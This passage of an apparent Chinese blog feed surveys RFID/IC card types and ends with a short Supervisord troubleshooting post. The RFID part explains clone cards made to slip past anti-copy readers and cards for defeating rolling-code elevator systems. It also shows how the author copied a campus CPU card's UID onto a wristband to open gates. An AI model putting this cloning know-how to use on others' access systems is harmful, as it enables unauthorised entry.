src="http://cdn.lmark.cc/img/image-20230131195307035.png"></p><p>可以看到，M0卡的UID有7个字节长，普通的M1卡只有四个。而且M0卡没有加密，所以M0卡只能用在一些身份识别的地方，比如地铁票，园区票之类。以下是M0卡的详细介绍：</p><blockquote><p>​Page0和Page1以及Page2的第1个字节是卡片的7字节序列号及其校验字节，其中<code>BCC0=0x88⊕SN0⊕SN1⊕SN2，BCC1=SN3⊕SN4⊕SN5⊕SN6</code>，SN0是制造商代码，由于Mifare UltraLight是NXP公司出品，因而SN0固定为04H。Page2的第2个字节Internal作为内部数据保留。以上共10个字节出厂时固化在存储区内，用户无法更改。</p><p>​Page3是一次性烧录(One Time Programmable,OTP)页,该页的内容在卡片出厂时全部被写为“0”，用户使用时只能把某一位的内容写为“1”，而永远也不能把“1”写为0，也就是说，新写入的4字节内容与卡内原来的内容进行异或，异或后的结果存储在卡片中。</p><p>​Page4-Page15是可读写的用户数据区，出厂时其内容初始化为0，用户可以任意读写。</p><p>​Page2的第3和第4个字节用于将存储区锁定为只读。如下图所示，L4-L15的某一位设置为1，则对应序号的Page内容锁定为只读，每一个Page都可以单独设置。Lotp用于锁定Page3为只读。“螳螂捕蝉，黄雀在后”，Lotp-L15可以锁定别人，这些位本身又被三个BL位锁定，BL15-10用于锁定L15-L10，BL9-4用于锁定L9-L4，BLotp用于锁定Lotp。所有的这16个锁定位也具有OTP特性，通俗的讲就是这些“锁”没有“钥匙”，一旦锁死就再也改不回来了，所以锁定时一定要小心。</p><p><img src="http://cdn.lmark.cc/img/image-20230131195928590.png"></p><p>​Mifare UltraLight的读写操作和 Mifare S50是完全兼容的，这里的“兼容”是指二者可以使用同一个读卡器硬件，同一套软件。当然若软硬件完全相同就不是两种卡了，二者的区别主要体现在软件操作上，包括以下4个方面：</p><ul><li>一是Mifare UltraLight的卡序列号有7个字节，而Mifare S50的卡序列号只有4个字节，因此在卡片防冲突选择阶段需要两层(Cascade，93H和95H)操作；</li><li>二是Mifare UltraLight没有密码，不需要验证；</li><li>三是Mifare UltraLight的Page相当于Mifare S50的BLOCK，因此Mifare UltraLight有16个BLOCK，且每个BLOCK只有4个字节，而Mifare S50有64个BLOCK,每个BLOCK有16个字节；</li><li>四是Mifare UltraLight没有电子钱包功能。</li></ul><p>​    基于以上四点，在Mifare S50的程序中在卡请求命令成功执行后，如果判断卡类型字节为Mifare UltraLight(0044H),则在之后的操作中增加第二层防冲突选择，卡选择成功后直接对卡片的0-15块进行读写操作，每次读写只关注前4个字节，不使用电子钱包功能，这样就可以两种卡片完全兼容了。</p><p>​    Mifare UltraLight适合一次性、不需要回收的低成本的电子票证、景区门票等场合的解决方案，据说推出Mifare UltraLight的本来目的是想与125KHz的ID卡竞争，并作为磁条卡的替代方案。从目前的情况看，Mifare UltraLight与ID卡的竞争情况并不乐观，而磁条卡的替代品也大多是ID卡。</p></blockquote><p>摘自：<a href="https://www.mwahiot.com/Service/MifareUltraLight.html">Mifare UltraLight-深圳市明华澳汉物联网技术有限公司 (mwahiot.com)</a></p><p>我曾今还是见过一次M0卡的，当时一个美国的网友找到我，给我看了张卡，当时我哪里懂这么多，只知道M1卡，就让他去读，结果读出来是M0卡，直接给我整懵了，后面上淘宝查了一下，没找到能复制M0卡的，不知道能不能用变色龙模拟出来。买个二手变色龙回来试试。</p><p><img src="http://cdn.lmark.cc/img/image-20230131202315380.png"></p><p>想进一步了解M0卡的可以移步data sheet：<a href="https://orangetags.com/rfid-chip-datasheet/nxp-rfid-chip-datasheet/mifare/nxp-mifare-ultralight-datasheet/">NXP Mifare Ultralight Datasheet (orangetags.com)</a></p><h3 id="判断M0和M1及Mifare系列其他卡"><a href="#判断M0和M1及Mifare系列其他卡" class="headerlink" title="判断M0和M1及Mifare系列其他卡"></a>判断M0和M1及Mifare系列其他卡</h3><p>可以通过SAK值判断，以下是常见的SAK值：</p><p><img src="http://cdn.lmark.cc/img/image-20230201040441114.png"></p><h2 id="MIFARE-Plus卡"><a href="#MIFARE-Plus卡" class="headerlink" title="MIFARE Plus卡"></a>MIFARE Plus卡</h2><p>MIFARE Plus卡有两种，分别是S和X。Plus是M1卡的升级，向下兼容M1卡，所以也被称为M1P卡或者MF1P，安全性对比M1卡有很大的提升，其特点有：</p><p>■ 2 kB或4 kB EEPROM<br>■ 固定存储器结构简单，兼容MIFARE Classic 1K和MIFARE Classic 4K<br>■ 存储器结构与MIFARE Classic 4K相同（区、块）<br>■ 可自由配置访问条件<br>■ PLUS S版本支持ISO&#x2F;IEC 14443 A类UID（4字节UID、4字节NUID、7字节UID），可选支持随机ID；PLUS X版本支持ISO&#x2F;IEC 14443-3 UID（4字节UID、4字节NUID、7字节UID），可选支持随机ID<br>■ 多扇区验证，多块读写<br>■ PLUS S版本具有AES-128用于实现身份验证和完整性；PLUS X版本具有AES-128用于实现身份验证、保密性和完整性<br>■ 写入AES密钥时具有防修改机制<br>■ 密钥能以MIFARE CRYPTO1密钥（每扇区2 × 48位）和AES密钥（每扇区2 × 128位）形式保存<br>■ 基本支持虚拟卡概念<br>■ 通信速度高达848 kb&#x2F;s<br>■ 单次写操作次数：200000个周期（典型值）<br>■ 通用标准认证：EAL4+</p><p><img src="http://cdn.lmark.cc/img/image-20230201041803766.png"></p><p>我手里的农行卡就是M2卡</p><h2 id="NTAG卡"><a href="#NTAG卡" class="headerlink" title="NTAG卡"></a>NTAG卡</h2><p>NTAG是NXP公司的一种NFC卡，从名字就可以看出，这种卡是符合NFC规约的Tag，可以被所有的NFC设备读取。常见的产品有：</p><ul><li><p>NTAG203 (144 bytes memory)没有密码保护功能，用法 Mifare Ultralight基本一样</p><p>以下是21X系列卡，有密码保护功能</p></li><li><p>NTAG210 (48 bytes memory)</p></li><li><p>NTAG212 (128 bytes memory)</p></li><li><p>NTAG213 (144 bytes memory)市面上常用的卡</p></li><li><p>NTAG215 (504 bytes memory)</p></li><li><p>NTAG216 (888 bytes memory)</p></li></ul><p>NTAG卡用起来和MIFARE UltraLisght-C卡类似，UID都为7位，且非常薄，网上买的NTAG标签基本上都是非常薄同时还比较小的。NTAG215的卡片信息：</p><p><img src="http://cdn.lmark.cc/img/image-20230202003837091.png"></p><p>NTAG213：</p><p><img src="http://cdn.lmark.cc/img/image-20230202003906841.png"></p><p>市面上比较常见的产品可能是那个米家碰碰贴，不过太贵了，20块两个，不如去抢钱。这种卡贴可以拿来干很多有意思的事，比如碰一碰连WIFI和蓝牙，有时间写一下米家碰碰贴的用法。除了这个，switch的amiibo卡好像也是一种NTAG标签，网上有人拿NTAG215来复制的。</p><h2 id="UID卡"><a href="#UID卡" class="headerlink" title="UID卡"></a>UID卡</h2><p>uid卡是国人发明的，全称Mifare UID Chinese magic card——中国魔术卡，国外称为GEN1。这个卡是针对S50的变种卡，用起来和M1 S50一模一样，但是0扇区可以随便修改，也就是说，卡号可以随便修改，厂商信息也可以随便更改，可以用来复制M1卡。但是缺点是，现在新的读卡系统，通过检测卡片对特殊指令的回应，可以检测出UID 卡，因此可以来拒绝UID 卡的访问，来达到屏蔽复制卡的功能。</p><p>在某宝上，UID卡还是很便宜的，一块多一张。通过**使用后门指令(magic指令)**来修改UID</p><h2 id="CUID卡"><a href="#CUID卡" class="headerlink" title="CUID卡"></a>CUID卡</h2><p>在国外称为GEN2，是UID卡的一种升级版，CUID卡可以重复修改0块，但是它和UID卡的区别是，UID卡是通过<strong>指令</strong>修改0块，CUID使用的是常规密码验证的方法写0块（写错了之后重写需要清卡），其他扇区和标准M1卡相同。缺点是，还是有可能会被检测出来，而且如果不小心写错了UID号的校验位导致无法读卡，没办法修复只能报废。</p><p>不响应后门指令(意味着不容易被反克隆系统发现)</p><p><img src="http://cdn.lmark.cc/img/image-20230131230703675.png"></p><p>一张CUID卡展示，外观上看不出来和M1卡有什么区别。某宝上一张要好几块。</p><h2 id="FUID卡"><a href="#FUID卡" class="headerlink" title="FUID卡"></a>FUID卡</h2><p>国外称GEN2，FUID卡是针对UID卡做的优化。新的读卡系统，通过检测卡片对特殊指令的回应，可以检测出UID卡，因此可以来拒绝UID卡的访问，来达到屏蔽复制卡的功能。<strong>FUID可以修改0块，但只可以修改一次</strong>，写错也没办法更改，也不能重复利用。修改后和M1卡完全一样，很难被屏蔽检测。</p><p>我没买过，也没用过，具体不知道是个什么情况</p><h2 id="UFUID卡"><a href="#UFUID卡" class="headerlink" title="UFUID卡"></a>UFUID卡</h2><p>鉴于FUID卡写错的成本太高，又发展出了这种卡。 CFUID卡 0扇区固化前可随意修改（相当于UID卡），固化（锁卡）后就跟M1卡完全一样。</p><h2 id="KUID卡"><a href="#KUID卡" class="headerlink" title="KUID卡"></a>KUID卡</h2><p>没听说过，摘自淘宝：</p><blockquote><p>新一代可擦写防屏蔽卡KUID，可重复使用替代普通防屏蔽卡。FUID，UFUID。<br>无需锁卡自动起防屏蔽作用，可重复擦写使用无废卡，不会像FUID或UFUID锁死后才起到防屏蔽作用，更不会因为锁卡而变成一次性卡，无法更改卡内数据成为废卡。<br>1、KUID防屏蔽卡专门对付物业升级的防复制卡和防复制读头，是物业升级后UID卡不能使用的 解决办法<br>2、KUID卡无论从功能上和价格格都比FUID和UFUID更方便，是制卡师傅的好帮手<br>1.可以重复擦写IC卡号和扇区，兼容UID卡和IC卡； 2.可重复擦写使用无废卡，不会像FUID或UFUID锁死后才起到防屏蔽作用（一体机只能写一次切记），更不会因为锁卡而变成一次性卡，无法更改卡内数据成为废卡； 3.KUID防屏蔽卡专门对付物业升级的防复卡和防复读头，是物业升级后UID卡刷卡无反应或者只能刷一次可以解决一部分这些问题，当然也不是完全能解决这个问题的，不过目前来看效果还是比较理想的有效率能达到90%； 4.本卡支持手机NFC功能写卡，请到各手机应用下载 mifare的工具。（手机功能有局限性，请大家酌情考虑手机测试建议购买白卡） 特别说明：由于需要兼容M1芯片的NFC手机直接改写0扇区内容，我们的UID卡的写卡方式不能用传统的ACR配套的软件，为此，我们特别开发的写卡程序。具体下载链接见以下描述。破解程序没有任何改变，只有写卡程序变了，注意：请下载我们的写卡软件链接ACR的读卡器来写入UID卡，否则无法写入。注意此KUID卡可反复擦写卡，可改写0扇区以及全部扇区数据的全开空卡可修改UID的mifare卡片，1k卡，S50卡，200张&#x2F;盒、钥匙扣100个一袋 1、该卡片完全兼容mifare 1k卡片； 2、卡片的block0（UID所在的block）可以修改，重复修改； 3、block0直接用普通mifare读写器修改； 4、卡片的默认密码为12个F，即FFFFFFFFFFFF。 存储容量： 8Kbit，16个分区,每分区两组密码 工作频率： 13.56MHZ 通讯速度： 106Kboud 读写距离： 2.5—10CM 读写时间： 1-2MS 工作温度： -20-85 擦写次数： 100000次 数据保存： 10年</p></blockquote><p>看起来像是CUID卡升级了，</p><h2 id="SUID卡"><a href="#SUID卡" class="headerlink" title="SUID卡"></a>SUID卡</h2><p>闻所未闻，摘自淘宝：</p><blockquote><p>防屏蔽可重复擦写0扇区0块（无需擦写可直接覆盖新数据）</p></blockquote><p>感觉又是一个CUID升级，，，但是什么叫做无需擦写可直接覆盖新数据呀？？？价格还是CUID的三倍。</p><h2 id="NUIC卡"><a href="#NUIC卡" class="headerlink" title="NUIC卡"></a>NUIC卡</h2><p>离谱，全网只看到一架淘宝店在买，又是一个CUID卡升级版。。。</p><h2 id="GUID，GDMIC，GTU卡"><a href="#GUID，GDMIC，GTU卡" class="headerlink" title="GUID，GDMIC，GTU卡"></a>GUID，GDMIC，GTU卡</h2><p>滚动码复制卡，用于滚动码防复制电梯系统，GTU卡锁卡后数据不再改变，每次上电后都会恢复为锁卡前的数据，从而使滚动码电梯系统无法正常滚动卡内数据，实现破解滚动码系统的目的。GTU可解锁，解锁后可通过GTU专用指令进行数据修改。</p><p>GDMIC是可以自动复位数据的IC复制卡，用于滚动码防复制系统，支持反复擦写，功能同GTU卡，生产厂商不同</p><h2 id="CPU卡"><a href="#CPU卡" class="headerlink" title="CPU卡"></a>CPU卡</h2><p>这个玩意比较高级了，可以说是最高级的IC卡了，CPU卡结构就像一台微型电脑一样，储存量大，而且极难破解，同时CPU卡还支持数据上云，即卡本身不存数据，只起到ID的作用。CPU卡现在没有一个统一的标准，但是大概结构如下：</p><blockquote><p>非接触cpu卡卡内集成电路中包括中央处理器（CPU）、只读存储器（ROM）、随机存取存储器(RAM)、电可擦除可编程只读存储器（EEPROM）以及片内操作系统COS等主要部分，犹如一台超小型电脑。具有信息量大、防伪安全性高、可脱机作业，可多功能开发等优点。<a href="https://www.msrfid.com/product/list-Dual_interface_CPU_Card.html">CPU卡</a>采用强大而稳定的安全控制器，增强了卡片的安全性。非接触<a href="https://www.msrfid.com/product/list-Dual_interface_CPU_Card.html">CPU卡</a>采用了无线传输的方式，通过射频方式获取能量和数据信号，能满足快速交易的要求（如公交的快速通过）。</p><p><a href="https://www.msrfid.com/product/list-Dual_interface_CPU_Card.html">CPU卡</a>采用了多种芯片级防攻击手段，基本上不可伪造;<a href="https://www.msrfid.com/product/list-Dual_interface_CPU_Card.html">CPU卡</a>能够在内部进行加解密运算，它所特有的内外部认证机制以及以金融IC卡规范为代表的专用认证机制，能够完全保证交易的合法性；在认证和交易过程中，CPU密钥不会泄露到卡外部，每次都是通过加密的随机数来进行，而且因为有随机数的参加，确保每次传输的内容不同，保证了交易的安全性。在认证和交易过程中所使用的密钥都是在安全的发卡环境中产生并密文安装到SAM卡和用户卡中，整个过程密钥不外露。</p><p>​    CPU卡的应用防火墙功能可以保障同一张卡中不同应用的安全独立性。对安全性要求较高的金融行业都以CPU卡作为下一代银行卡的标准。采用非接触式CPU卡可以杜绝伪造卡、伪造终端、伪造交易，最终保证了系统的安全性。</p><p>优点</p><p>同时，非接触CPU卡的大容量存储空间又可以满足预期的大金额消费应用所要求的更多客户信息的存储。而这时安全就不仅仅是存储在卡内的电子货币的安全，还包括个人信息的安全，非接触式CPU卡的安全机制可以为此提供良好的保障。</p><p><strong>应用</strong></p><p>由于非接触式CPU卡具有以上无可比拟的优点，非常适用于电子钱包、电子存折、公路自动收费系统、公共汽车自动售票系统、社会保障系统、IC卡加油系统、安全门禁等等众多的应用领域。非接触CPU卡将逐步取代逻辑加密卡而成为IC卡的主要选型。在<a href="https://www.msrfid.com/product/Mifare_s50.html">M1卡</a>被破解的形势下，采用非接触CPU卡取代<a href="https://www.msrfid.com/product/Mifare_s50.html">M1卡</a>是解决<a href="https://www.msrfid.com/product/Mifare_s50.html">M1卡</a>危机的最终解决方案。</p><p><strong>种类</strong></p><p>1、非接触式CPU<a href="https://www.msrfid.com/product/list-SmartCard.html">智能卡</a>（8K&#x2F;16K，DES&#x2F;3DES算法）</p><p>非接触式CPU<a href="https://www.msrfid.com/product/list-SmartCard.html">智能卡</a>（8K&#x2F;16K，DES&#x2F;3DES算法）的芯片采用CMOS EEPROM工艺制作的高端<a href="https://www.msrfid.com/product/list-SmartCard.html">智能卡</a>产品，典型的应用如公共交通、电子钱包等。符合ISO&#x2F;IEC14443 TYPE A标准的RF电路、32位随机数电路、DES&#x2F;3DES算法模块、流加密处理器，卡上程序存储器为32K×8位EEPROM、512×8位RAM。</p><p>2、非接触式CPU<a href="https://www.msrfid.com/product/list-SmartCard.html">智能卡</a>（国密SM1算法）</p><p>这款卡片是单界面非接触CPU芯片，产品支持ISO14443-A协议，CPU指令兼容通用8051指令，数据存储器为8K字节的EEPROM。该芯片符合银行的相关标准，COS同时支持PBOC2.0标准（电子钱包）及建设部IC卡应用规范，具有较好的安全性。</p></blockquote><p>摘自：<a href="https://www.msrfid.com/product/39.html">非接触式CPU卡-智能卡,电子标签,java卡,rfid卡,非接触式IC卡,NFC卡-深圳市明申科技有限公司 (msrfid.com)</a></p><p>CPU卡能做到真正的<strong>一钥一用</strong>，从一开始的<strong>多卡一钥</strong>到后来的<strong>一卡一钥</strong>，再到后来的<strong>一块一钥</strong>，可以看出IC卡加密技术的进步呀。尽管如此，现在还有很多地方在使用M1卡，甚至还有很多地方在使用有漏洞的M1卡！！！这真是，像裸奔一样。如果对CPU卡或者M1卡安全性感兴趣的小伙伴，可以看看这篇文章：<a href="https://www.mwahiot.com/Service/CPU_Card_Encryption_and_M1_Encryption.html">CPU卡加密系统与M1加密系统比较-深圳市明华澳汉物联网技术有限公司 (mwahiot.com)</a></p><h3 id="如何区分CPU卡和M1卡"><a href="#如何区分CPU卡和M1卡" class="headerlink" title="如何区分CPU卡和M1卡"></a>如何区分CPU卡和M1卡</h3><p>CPU卡和M1卡在外观和大小上，可以说毫无差异。所以怎么区分就成了一个棘手的难题。以下是我总结的几个方法：</p><ul><li>如果卡支持在线充值，且有挂失功能，大概率是CPU卡</li><li>使用Mifare classic tool工具读卡，其SAK的值位0x20的就是CPU卡</li><li>给卡后面的电话打过去，问客服这个卡的种类</li></ul><h3 id="CPU卡门禁部分的复制"><a href="#CPU卡门禁部分的复制" class="headerlink" title="CPU卡门禁部分的复制"></a>CPU卡门禁部分的复制</h3><p>总所周知，CPU卡现在无法破解，但是可以通过复制其UID到手环或者白卡里面，使用部分门禁功能。</p><p>CPU卡的UID从ATS中获取，取ATS的后四位：</p><p><img src="http://cdn.lmark.cc/img/image-20230201031549695.png"></p><p>然后可以把这个UID写进一个空白的dump文件里，也可以直接写入卡里，记得BCC校验，也就是第五位的值由UID的四位异或而来。亲测，我学校的校园卡，我把UID写进手环里，可以刷宿舍楼门禁、学校大门的闸机和图书馆炸鸡，但是图书馆签到刷不了。显然图书馆签到使用到了CPU卡的UID之外的部分。</p><h2 id="CPU模拟卡"><a href="#CPU模拟卡" class="headerlink" title="CPU模拟卡"></a>CPU模拟卡</h2><p>我也不是很懂为什么会有CPU模拟卡这种东西，仔细想想，可能为了省钱把。关于CPU模拟卡的知识：<a href="https://www.cnblogs.com/strengthen/p/16083888.html">CPU模拟卡 - 为敢技术 - 博客园 (cnblogs.com)</a></p><blockquote><p>CPU模拟卡由CPU部分7K以及M1部分1K组成，常见的有复旦FM1208(7K+1K)其中7K为CPU部分容量大小，1K为M1卡容量大小，通过在PM3上点击读卡类型（指令hf 14a info）可进行查看，下图为冰人固件读取模拟卡的原始返回,在带有NFC功能的手机上，可以通过MCT软件进行读卡，其返回值件下图。</p><p><img src="http://cdn.lmark.cc/img/960222-20220331202307314-1690826322.png" alt="img"></p></blockquote><h3 id="判断方法"><a href="#判断方法" class="headerlink" title="判断方法"></a>判断方法</h3><p>可以直接使用MCT工具读卡，如果提示信息显示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SAK:28</span><br><span class="line">ATQA:0004</span><br><span class="line">TYPE:JCOP31 or JCOP41 v2.3.1</span><br></pre></td></tr></table></figure><p>即为CPU模拟卡。我手上的中国银行的卡就是一张CPU模拟卡</p><h2 id="双频卡"><a href="#双频卡" class="headerlink" title="双频卡"></a>双频卡</h2><p>不是什么新东西，从名字就可以知道，是两种频率的线圈塞进一张卡里的产物，有<strong>低频+高频</strong>和<strong>高频+超高频（902~928MHz）</strong>。至于它有什么用，就是一张卡可以当ID卡用，也可以当IC卡用了哈哈哈。</p><p>毕竟ID卡的线圈这么小，可以塞进IC卡里也不奇怪。有下图那样式的：</p><p><img src="http://cdn.lmark.cc/img/image-20230201035031634.png"></p><h2 id="接触式和非接触式IC卡"><a href="#接触式和非接触式IC卡" class="headerlink" title="接触式和非接触式IC卡"></a>接触式和非接触式IC卡</h2><p>IC卡又可以分为接触式IC卡和非接触式IC卡。</p><ul><li><strong>接触式IC卡</strong>：该类卡是通过IC卡读写设备的触点与IC卡的触点接触后进行数据的读写；</li><li><strong>非接触式IC卡</strong>：又称射频卡、感应式IC卡，该类卡与卡设备无电路接触，而是通过非接触式的读写技术进行读写（例如RFID、NFC），其内嵌芯片除了CPU、逻辑单元、存储单元外，增加了射频收发电路。该类卡一般用在使用频繁、信息量相对较少、可靠性要求较高的场合。</li></ul><p>两者比较好区分，直接看卡上有无金属触点即可。</p><p><img src="http://cdn.lmark.cc/img/38bbdc0d9a9c42258ab7bccdb83c6d20.png" alt="img"></p><h2 id="ISO14443-typeB标准的IC卡"><a href="#ISO14443-typeB标准的IC卡" class="headerlink" title="ISO14443 typeB标准的IC卡"></a>ISO14443 typeB标准的IC卡</h2><p>前面讲的这些都是使用了typeA标准的IC卡，接下来介绍一下typeB标准的卡，先来看看两种标准的异同。</p><p>跟ISO 14443 -Type A 标准 的不同主要在于<strong>载波的调制深度及位的编码方式</strong>。TYPE A采用<strong>开关键控(On-Off keying)<strong>的</strong>Manchester编码</strong>，TYPE B采用<strong>NRZ-L</strong>的<strong>BPSK编码</strong>。</p><p>TYPE B与TYPE A相比，具有<strong>传输能量不中断、速率更高、抗干扰能力强</strong>的优点。RFID的核心是防冲突技术，这也是和接触式IC卡的主要区别。ISO14443-3规定了TYPEA和TYPE B的防冲突机制。二者防冲突机制的原理不同，前者是<strong>基于位冲突检测协议</strong>，而TYPE B<strong>通信系列命令序列完成防冲突。</strong></p><p>目前的二代身份证，社保卡，护照都是基于此标准，可见这个标准的安全性会比较好。</p><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>晕了，终于写完了，史上最全的RFID卡信息汇总。这里面一半的卡我连见都没见过，也算是涨知识了，还记得一开始的原因只是有人把M1卡逐出了IC卡籍。一怒之下就写了一万多字，不愧是我，巨能水。</p><p>在写的过程中，我偶然间找到一篇12年前的帖子，在探讨破解M1卡的方法，里面有几层楼的贴很有意思：</p><p><img src="http://cdn.lmark.cc/img/image-20230202005757978.png"></p><p>11年的时候M1卡就已经是很老的技术了，没想到到了23年，市面上还有这么多的M1卡。另一条：</p><p><img src="http://cdn.lmark.cc/img/image-20230202010104383.png"></p><p>当时能够轻易修改UID的UID卡尚未出现，他们不会想到，12年后的现在，M1卡像一个筛子一样，能被随便复制。</p><p>比起M1卡，更令人唏嘘的还是NFC技术，众所周知NFC技术早在2G时代就已经被应用于手机上，NFC卡贴更是十几年前就已经出现。这种手机碰一碰就能交互，获取信息的功能，想想就很好用，但事实是，2023年的今天，NFC卡贴仍没有流行起来，原因很多，其中，我觉得很重要的一个原因就是二维码的出现。NFC卡贴能做到的事情，使用二维码扫一扫也能做到，而且手机厂商也不用额外做硬件支持（摄像头应该手机都有吧现在），而NFC功能即使是今天，仍然有很多手机不支持。</p><p>可能唯一NFC能打败二维码的场景就是地铁站了，每次我滴一下就进站了，同伴们还要打开app去扫码，想想就很爽嘻嘻。</p><p>最后吐槽一下，再找资料的过程中，百度出的很多资料要么讲的太细，要么什么都没讲，结果最后发现，淘宝的商品详情页或成了找资料的好地方。</p><p><img src="http://cdn.lmark.cc/img/image-20230202012319261.png"></p><p>这上面列举的卡比我在网上找的都详细，害。然后去谷歌上找了很多data sheet和官网的资料，还看了不少维基的内容，只能说，百度能找到的东西太少了，优质知识有时候付费也找不到。最后我放一下所有参考资料把，大家感兴趣可以去看看。我这里终究还是有很多没讲到。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://www.msrfid.com/product/39.html">非接触式CPU卡-智能卡,电子标签,java卡,rfid卡,非接触式IC卡,NFC卡-深圳市明申科技有限公司 (msrfid.com)</a></p><p><a href="https://www.mwahiot.com/Service/CPU_Card_Encryption_and_M1_Encryption.html">CPU卡加密系统与M1加密系统比较-深圳市明华澳汉物联网技术有限公司 (mwahiot.com)</a></p><p><a href="https://www.mwahiot.com/news/The_Difference_between_legic_Chip_and_mifare_Chip_Characteristics.html">浅谈legic芯片和 mifare芯片特性之区别-深圳市明华澳汉物联网技术有限公司 (mwahiot.com)</a></p><p><a href="https://www.bbsmax.com/A/kmzLm6KYJG/">IC卡和RFID卡的区别（网上说的都不准确） (bbsmax.com)</a></p><p><a href="https://www.mwahiot.com/Service/MifareUltraLight.html">Mifare UltraLight-深圳市明华澳汉物联网技术有限公司 (mwahiot.com)</a></p><p><a href="https://zhuanlan.zhihu.com/p/264996978">IC卡、ID卡、CPU卡、RFID和NFC的区别 - 知乎 (zhihu.com)</a></p><p><a href="https://blog.csdn.net/pingis58/article/details/125458697">NFC手机模拟加密门禁卡_nfc加密卡_pingis58的博客-CSDN博客</a></p><p><a href="https://www.cnblogs.com/liujunjun/p/14684711.html">网络安全攻防：RFID安全 - The_crossing - 博客园 (cnblogs.com)</a></p><p><a href="https://www.cnblogs.com/osnosn/p/10662647.html">用EM4305&#x2F;T5557模拟EM4100的ID卡,原理解释 - osnosn - 博客园 (cnblogs.com)</a></p><p><a href="https://baijiahao.baidu.com/s?id=1741569464547237663&wfr=spider&for=pc">EM4205 &#x2F; EM4305 芯片卡 (baidu.com)</a></p><p><a href="https://blog.csdn.net/good02xaut/article/details/121853435">HID卡，125K低频门禁卡的贵族_good02xaut的博客-CSDN博客_hid卡</a></p><p><a href="http://www.it922.com/solutions/std4.htm">|Indala感应卡|Indala厚卡|Indala薄卡|Indala门禁卡|Indala门禁|| (it922.com)</a></p><p><a href="https://zhuanlan.zhihu.com/p/480056610">RFID卡片种类 - 知乎 (zhihu.com)</a></p><p><a href="https://blog.csdn.net/good02xaut/article/details/121796554">RFID低频卡-125K门禁卡种类_good02xaut的博客-CSDN博客_tk4100和t5577的区别</a></p><p><a href="https://www.cnblogs.com/strengthen/p/16083888.html">CPU模拟卡 - 为敢技术 - 博客园 (cnblogs.com)</a></p><p><a href="https://www.freebuf.com/articles/network/223864.html">RFID基础概念梳理及攻击方法 - FreeBuf网络安全行业门户</a></p><p><a href="https://www.52tikong.com/forum.php?mod=viewthread&tid=10947&extra=page=7">普及下卡片基础知识(知道的神仙们请略过)电梯卡延期，电梯卡修改楼层，计算效验，车卡门禁卡，复制电梯卡门禁卡车卡，PM3，ACR122U NFC PN532等设备教程，IC卡延期 - Powered by Discuz! (52tikong.com)</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      
        <title>Supervisord进程管理工具的重启问题 supervisor.sock no such file</title>
      
      <link href="/archives/6bff89fa.html"/>
      <url>/archives/6bff89fa.html</url>
      
        <content type="html"><![CDATA[<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>前两天，黄哥找到我说，有个网站挂了，需要我去恢复一下，然后给了我账号密码，然后我就去看了一下，然后发现网站使用的是flask搭的，但是，我不太了解，完全不知道是用什么来启动的。甚至nginx都没配软连接，后面拿到了帮助文档才知道，原来使用Supervisord来启动和守护进程。因为之前阿里云服务器空调故障，导致服务器宕机。这个Supervisord直接异常退出了，按照网上的方法，并没有用，然后就去研究了一下。</p><h2 id="关于Supervisord"><a href="#关于Supervisord" class="headerlink" title="关于Supervisord"></a>关于Supervisord</h2><p>Supervisor 是一个用 Python 写的进程管理工具，可以很方便的用来在 UNIX-like 系统（不支持 Windows）下启动、重启（自动重启程序）、关闭进程（不仅仅是 Python 进程）<br>Supervisor 是一个 C&#x2F;S 模型的程序，supervisord 是 server 端，supervisorctl 是 client 端</p><p>supervisord的出现，可以用来管理后台运行的程序。通过supervisorctl客户端来控制supervisord守护进程服务，真正进行进程监听的是supervisorctl客户端，而运行supervisor服务时是需要制定相应的supervisor配置文件的。<br>Supervisord工具的整个使用流程：<br>1、首先通过echo_supervisord_conf 生成配置文件模板<br>2、然后你根据自己的需求进行修改，接着就使用相应的命令来使用supervisorctl客户端<br>3、而supervisorctl客户端会将对应的信息传递给supervisord守护进程服务，让supervisord守护进程服务进行进程守护。</p><h2 id="问题复现及解决"><a href="#问题复现及解决" class="headerlink" title="问题复现及解决"></a>问题复现及解决</h2><p>supervisorctl的几条指令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">supervisorctl restart all  </span><br><span class="line">supervisorctl status</span><br><span class="line">supervisorctl start all </span><br><span class="line">supervisorctl stop all</span><br></pre></td></tr></table></figure><p>首先，直接重启的时候，会出现<code>unix:///var/run/supervisor/supervisor.sock no such file</code>报错</p><p><img src="http://cdn.lmark.cc/img/image-20230103063505361.png"></p><p>如果此时按照网上的方法手动新建一个supervisor.sock，就会出现refused connection的错误，然后网上的教程就说是软连接问题，需要解除一下，但是一解除这个文件就会被删除。所以那个教程还挺自相矛盾。</p><p><img src="http://cdn.lmark.cc/img/image-20230103063825898.png"></p><p>此时正确的做法是，应该重新指定配置文件，这样就能正确的生成一个sock文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">supervisord -c /etc/supervisord.conf</span><br></pre></td></tr></table></figure><p><img src="http://cdn.lmark.cc/img/image-20230103064102823.png"></p><p>然后重启即可</p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Supervisord </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>DjangoAdmin后台collectstatic不生效问题</title>
      
      <link href="/archives/2514f762.html"/>
      <url>/archives/2514f762.html</url>
      
